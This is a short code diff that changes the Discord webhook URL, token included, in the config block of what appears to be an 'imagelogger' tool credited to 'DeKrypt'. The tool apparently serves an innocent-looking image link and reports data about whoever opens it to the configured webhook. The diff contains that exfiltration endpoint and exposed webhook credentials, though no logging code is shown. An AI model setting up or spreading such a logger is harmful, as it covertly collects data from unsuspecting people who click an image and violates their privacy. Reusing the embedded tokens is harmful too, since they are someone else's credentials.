@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1378406065737302157/Z5KzyDcUbr5TakXqZ0eYI31Cn8B59iW80Dnu6EUhaCHJHXh1uErvTQNUlzjrX-pqZwIJ",
+    "webhook": "https://discord.com/api/webhooks/1379516891302858812/ilBCE5_DKSwuDg8PsLNysz3ggEehhg6RSeaar3GcyZDSY2j36fD2eKDKdOI0be0bT4fg",
     "image": "https://cdn.wallpaperhub.app/cloudcache/6/9/0/e/e/f/690eefe3ba1f553e0ea527f51ee407b604b681b4.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
